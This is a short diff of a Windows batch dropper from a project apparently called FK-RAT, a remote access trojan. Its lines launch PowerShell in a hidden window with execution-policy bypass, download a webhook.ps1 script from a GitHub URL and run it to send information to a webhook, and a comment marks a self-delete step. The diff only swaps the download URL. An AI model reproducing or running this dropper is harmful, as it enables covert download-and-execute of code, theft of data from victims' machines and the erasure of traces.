@@ -18,7 +18,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI
 powershell ./wget.cmd
 
 @REM Send information to Webhook
-powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1 -OutFile webhook.ps1"
+powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1"
 powershell -ep bypass ./webhook.ps1 "%WEBHOOK%"
 
 @REM self delete
